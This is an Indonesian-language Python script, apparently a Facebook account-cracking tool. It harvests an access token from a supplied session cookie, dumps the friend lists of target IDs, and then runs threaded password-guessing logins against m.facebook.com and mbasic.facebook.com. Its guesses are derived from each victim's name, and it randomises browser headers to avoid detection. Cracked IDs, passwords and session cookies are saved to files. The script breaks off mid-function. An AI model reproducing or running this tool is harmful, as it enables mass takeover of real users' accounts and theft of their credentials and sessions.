import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich import print as cetak
from rich.panel import Panel as nel
import requests
import random
id,id2,uid = [],[],[]
tokene = []
user = []
akunyeh = []
loop,zar = 0,[]
ok,cp,oo = 0,0,[]
ses = requests.Session()
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

P = '\x1b[1;97m'
M = '\x1b[1;91m'	
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

def cokzar():
    try:
        os.system('clear')
        banlog()
        cok = {'cookie': input('ENTER COOKIE : ')}
        link = ses.get('https://www.facebook.com/adsmanager/manage/campaigns' , cookies = cok).text
        gx = re.search("act=(.*?)&nav_source",str(link)).group(1)
        get = ses.get('https://www.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(gx), cookies = cok).text
        tok = re.search('accessToken="(.*?)"',str(get)).group(1)
        open(".tokzar.txt", "w").write(tok)
        open(".cokzar.txt", "w").write(cok['cookie'])
        print('\nToken : {}'.format(tok))
        exit()
    except(Exception) as e:
        print('Cookies Mokad') ; time.sleep(3)
        print(e)
        login()

def log_zar():
    try:
        token = open('.tokzar.txt','r').read()
        cok = open('.cokzar.txt','r').read()
        tokene.append(token)
        try:
            gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokene[0], cookies={'cookie':cok})
            nteng = json.loads(gerap.text)['id']
            zara(nteng)
        except KeyError:
            cokzar()
        except requests.exceptions.ConnectionError:
            exit()
    except IOError:
        cokzar()
        
def zahra_animasi(berjalan):
    for gas in berjalan + "\n":
        sys.stdout.write(gas)
        sys.stdout.flush()
        time.sleep(0.05)
def zahra_animasi2(berjalan):
    for gas in berjalan + "\n":
        sys.stdout.write(gas)
        sys.stdout.flush()
        time.sleep(0.10)
def zahra_animasi3(berjalan):
    for gas in str(berjalan) + "\n":
        sys.stdout.write(gas)
        sys.stdout.flush()
        time.sleep(0.01)
def banzar():
    zahra_animasi3(f'''{xxx}

................................................
.{m}%%%%%%{xxx}..{m}%%%%%%{xxx}..{m}%%%%%{xxx}...{h}%%%%%%{xxx}...{h}%%%%{xxx}...{h}%%{xxx}..{h}%%{xxx}.
.{m}%%{xxx}........{m}%%{xxx}....{m}%%{xxx}..{m}%%{xxx}.....{h}%%{xxx}...{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}.
.{m}%%%%{xxx}......{m}%%{xxx}....{m}%%%%%{xxx}.....{h}%%{xxx}....{h}%%%%%%{xxx}..{h}%%%%%%{xxx}.
.{m}%%{xxx}........{m}%%{xxx}....{m}%%{xxx}..{m}%%{xxx}...{h}%%{xxx}.....{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}.
.{m}%%{xxx}......{m}%%%%%%{xxx}..{m}%%{xxx}..{m}%%{xxx}..{h}%%%%%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}.
................................................
''')

def banlog():
    print('''\x1b[1;92m
         _____   ______ _____ __   _     
 |      |     | |  ____   |   | \  |     
\33[m |_____ |_____| |_____| __|__ |  \_| 
''')

def zara(id):
    try:
        cok = open('.cokzar.txt','r').read()
    except IOError:
        cokzar()
    os.system('clear')
    banzar()
    #os.system("xdg-open https://wa.me/+6283170597744?text=Assalamualaikum+makasih+kak+sc+nya+moga+sehat+selalu+amin😁")
    cetak(nel(f'{xxx} 1. crack\n 2. dump file\n 3. lapor bug ({h}WhatsApp{xxx})'))
    zahra = input(f' input: ')
    if zahra == '1':
        #zahra_animasi2(f' {h}SEDANG UJI COBA SEMENTARA GA [ADA ')
        #waktu(5)
        #log_zar()
        print(f'{xxx}')
        uid = input('  ENTER ID: ').split(',')
        for x in uid:
            nge_krek2(x, '')
    elif zahra == '2':
        asi()
    elif zahra == '3':
        os.system("xdg-open https://wa.me/+6283170597744?text=halo+kak")
        log_zar()
    else:
        log_zar()
def asi():
    try:
        print(f'')
        print(f'{xxx} 1. DUMP ID{h} 61.10009.10008')
        print(f'{xxx} 2. DUMP SEMUA ID{xxx}')
        zahraa = input(f'{xxx}>> : ')
        if zahraa == '1':
            print(f'{xxx}')
            uid = input('  ENTER ID: ').split(',')
            for x in uid:
                nge_krek(x, '')
        elif zahraa == '2':
            print(f'{xxx}')
        uid = input('  ENTER ID: ').split(',')
        for x in uid:
            nge_krek1(x , '')
        else:
            asi()
    except Exception as e:
        print(f'Error: {e}')
        

def nge_krek(uidz, after):
    try:
        tok = open('.tokzar.txt', 'r').read()
        cok = {'cookie': open('.cokzar.txt', 'r').read()}
    except IOError:
        exit()
    
    try:
        if len(id) == 0:
            params = {
                'access_token': tok,
                'fields': 'friends'
            }
        else:
            params = {
                'access_token': tok,
                'fields': 'friends.after({})'.format(after)
            }
        
        po = ses.get('https://graph.facebook.com/{}'.format(uidz), params=params, cookies=cok).json()
        
        for x in po['friends']['data']:
            id_prefix = x.get('id')[:2]
            id_prefix5 = x.get('id')[:5]
            if id_prefix == '61' or id_prefix5 in ('10009', '10008'):
                id.append(x.get('id') + '|' + x.get('name'))
                print("  TOTAL ID: " + str(len(id)), end='\r')
        
        afr = po['friends']['paging']['cursors']['after']
        nge_krek1(uidz, afr)
    except KeyError:
        pass
    
    simpan()

def nge_krek1(uidz , after):
    try:
        tok = open('.tokzar.txt','r').read()
        cok = {'cookie':open('.cokzar.txt','r').read()}
    except IOError:
        exit()
    try:
        if len(id)==0:
            params = {
              'access_token': tok,
              'fields': 'friends'
            }
        else:
            params = {
              'access_token': tok,
              'fields': 'friends.after({})'.format(after)
            }
        po = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
        for x in po['friends']['data']:
            id.append(x.get('id')+'|'+x.get('name'))
            print("  TOTAL ID : "+str(len(id)) , end = '\r') 
        afr = po['friends']['paging']['cursors']['after']
        nge_krek1(uidz , afr)
    except(KeyError) as e:
        pass
    simpan()
    
def nge_krek2(uidz , after):
    try:
        tok = open('.tokzar.txt','r').read()
        cok = {'cookie':open('.cokzar.txt','r').read()}
    except IOError:
        exit()
    try:
        if len(id)==0:
            params = {
              'access_token': tok,
              'fields': 'friends'
            }
        else:
            params = {
              'access_token': tok,
              'fields': 'friends.after({})'.format(after)
            }
        po = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
        for x in po['friends']['data']:
            id.append(x.get('id')+'|'+x.get('name'))
            print("  TOTAL ID : "+str(len(id)) , end = '\r') 
        afr = po['friends']['paging']['cursors']['after']
        nge_krek2(uidz , afr)
    except(KeyError) as e:
        pass
    zar_atur()
    
def simpan():
    while True:
        zahra_animasi(f'\n{xxx}   ({h}Mau disimpan di repositori mana?{xxx})')
        zahra_animasi(f'{xxx}   ({h}CONTOH: {xxx}/storage/emulated/0/Download/{xxx})')
        zahra_animasi(f'{xxx}   ({h}atau Ketik "{xxx}y{h}" untuk simpan otomatis{xxx})')
        zahra_animasi(f'{xxx}   ({h}DI: {xxx}/storage/emulated/0/ZAHRA-DUMP/{xxx})')
        repo_dir = input(' Input: ')
        
        if repo_dir.lower() == 'y':
            repo_dir = '/storage/emulated/0/ZAHRA-DUMP/'
            if not os.path.isdir(repo_dir):
                os.mkdir(repo_dir)
            break
        elif not os.path.isdir(repo_dir):
            print('Direktori repositori tidak valid. Silakan coba lagi.')
        else:
            break

    zahra_animasi(f'\n{xxx}   ({h}Nama file contoh sayang.txt{xxx})')
    file_name = input(' Input: ')

    file_path = os.path.join(repo_dir, file_name)

    with open(file_path, 'w') as file:
        for uid in id:
            file.write(uid + '\n')

    zahra_animasi(f' disimpan di repositori {h}{file_path}')
    exit()
    
def zar_atur():
    print(f'{xxx}')
    print(f'{xxx}')
    print(f'   [[{hijo}CRACK DARI ID{xxx}]]')
    print(f' 1. [{m}TUA{x}]')
    print(f' 2. [{h}MUDA{x}]')
    print(f' 3. [{b}ACAK{x}]')
    zarid = input(f'{xxx}>: ')
    if zarid in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif zarid in ['2','02']:
        xbaru=[]
        for baru in sorted(id):
            xbaru.append(baru)
        bkp=len(xbaru)
        bkpp=(bkp-1)
        for miyabi in range(bkp):
            id2.append(xbaru[bkpp])
            bkpp -=1
    elif zarid in ['3','03']:
        for acak in id:
            xnxx = random.randint(0,len(id2))
            id2.insert(xnxx,acak)
    else:
        zahra_animasi2(f' KETIK YANG BENER SAYANG')
        exit()
    print(f'{h}  METODE LOGIN{xxx}')
    print(f'{x} 1. m.facebook.com\n 2. mbasic.facebook.com')
    zar_metode = input(f'{xxx}> : ')
    if zar_metode in ['1','01']:
        zar.append('metode1')
    elif zar_metode in ['2','02']:
        zar.append('metode2')
    else:
        zar.append('metode1')
    apaci()
def apaci():
    global prog, des
    print(f'{xxx}')
    prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('', total=len(id))
    with prog:
        with tred(max_workers=30) as gas_krek:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                zar_password = ['kamunanya','kamu nanya']
                pwt = []
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        zar_password.append(nmf)
                        zar_password.append(frs+'123')
                        zar_password.append(frs+'1234')
                        zar_password.append(frs+'12345')
                        zar_password.append(frs+'4321')
                        zar_password.append(frs+'01')
                        zar_password.append(frs+'02')
                        zar_password.append(frs+'03')
                        zar_password.append(frs+'04')
                        zar_password.append(frs+'05')
                        zar_password.append(frs+'06')
                        zar_password.append(frs+'07')
                        zar_password.append(frs+'321')
                else:
                    if len(frs) < 3:
                        zar_password.append(nmf)
                    else:
                        zar_password.append(nmf)
                        zar_password.append(frs+'123')
                        zar_password.append(frs+'1234')
                        zar_password.append(frs+'12345')
                        zar_password.append(frs+'4321')
                        zar_password.append(frs+'01')
                        zar_password.append(frs+'02')
                        zar_password.append(frs+'03')
                        zar_password.append(frs+'04')
                        zar_password.append(frs+'05')
                        zar_password.append(frs+'06')
                        zar_password.append(frs+'07')
                        zar_password.append(frs+'321')
                if 'ya' in pwt:
                    for xpwn in pwn:
                        zar_password.append(xpwn)
                else:
                    pass
                if 'metode1' in zar:
                    gas_krek.submit(crack, idf, zar_password, 'm.facebook.com')
                elif 'metode2' in zar:
                    gas_krek.submit(crack2, idf, zar_password)
                else:
                    gas_krek.submit(crack, idf, zar_password, 'm.facebook.com')
        print(f'{xxx}')
        print(f'{hijo} {puti}AKUN BERHASIL LOGIN: {hijo}%s{xxx} ' % (ok))
        print(f'{kun} {puti}AKUN CHEKPOINT : {kun}%s{xxx} ' % (cp))
        print(f'{xxx}')
        
def crack(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	prog.update(des,description=f'\r{h}1 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(user)
			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}[{b}CHEKPOINT{x}]{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cetak(nel(f'\r {x}[{b}BERHASIL LOGIN{x}]{x}\n TAHUN BUAT {x}{h}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {h}{idf}{x}\n {xxx}PASSWORD {h}{pw}{x}\n {xxx}COOKIE {h}{kukis}{x}\n {x}USER {h}{ua}{N}'))
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
def crack2(idf,pwx):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	prog.update(des,description=f'\r{h}2 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(user)
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D237004119751468%26auth_type%3Drerequest%26cbt%3D1701841303479%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df13a8e7750bcb04%2526domain%253Dlabdoor.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flabdoor.com%25252Ff1d135f363dd294%2526relation%253Dopener%26client_id%3D237004119751468%26display%3Dtouch%26domain%3Dlabdoor.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Flabdoor.com%252Flogin%26locale%3Den_US%26logger_id%3Df2c4d4d49db6f48%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cf5ab6716b9a8%2526domain%253Dlabdoor.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flabdoor.com%25252Ff1d135f363dd294%2526relation%253Dopener%2526frame%253Dfb9353f383cee8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1cf5ab6716b9a8%26domain%3Dlabdoor.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Flabdoor.com%252Ff1d135f363dd294%26relation%3Dopener%26frame%3Dfb9353f383cee8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=237004119751468&kid_directed_site=0&app_id=237004119751468&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D237004119751468%26auth_type%3Drerequest%26cbt%3D1701841303479%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df13a8e7750bcb04%2526domain%253Dlabdoor.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flabdoor.com%25252Ff1d135f363dd294%2526relation%253Dopener%26client_id%3D237004119751468%26display%3Dtouch%26domain%3Dlabdoor.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Flabdoor.com%252Flogin%26locale%3Den_US%26logger_id%3Df2c4d4d49db6f48%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cf5ab6716b9a8%2526domain%253Dlabdoor.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flabdoor.com%25252Ff1d135f363dd294%2526relation%253Dopener%2526frame%253Dfb9353f383cee8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1cf5ab6716b9a8%26domain%3Dlabdoor.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Flabdoor.com%252Ff1d135f363dd294%26relation%3Dopener%26frame%3Dfb9353f383cee8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{str(rr(10,100))}", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D237004119751468%26auth_type%3Drerequest%26cbt%3D1701841303479%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df13a8e7750bcb04%2526domain%253Dlabdoor.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flabdoor.com%25252Ff1d135f363dd294%2526relation%253Dopener%26client_id%3D237004119751468%26display%3Dtouch%26domain%3Dlabdoor.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Flabdoor.com%252Flogin%26locale%3Den_US%26logger_id%3Df2c4d4d49db6f48%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cf5ab6716b9a8%2526domain%253Dlabdoor.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flabdoor.com%25252Ff1d135f363dd294%2526relation%253Dopener%2526frame%253Dfb9353f383cee8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1cf5ab6716b9a8%26domain%3Dlabdoor.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Flabdoor.com%252Ff1d135f363dd294%26relation%3Dopener%26frame%3Dfb9353f383cee8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}[{b}CHEKPOINT{x}]{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cetak(nel(f'\r {x}[{b}BERHASIL LOGIN{x}]{x}\n TAHUN BUAT {x}{h}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {h}{idf}{x}\n {xxx}PASSWORD {h}{pw}{x}\n {xxx}COOKIE {h}{kukis}{x}\n {x}USER {h}{ua}{N}'))
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
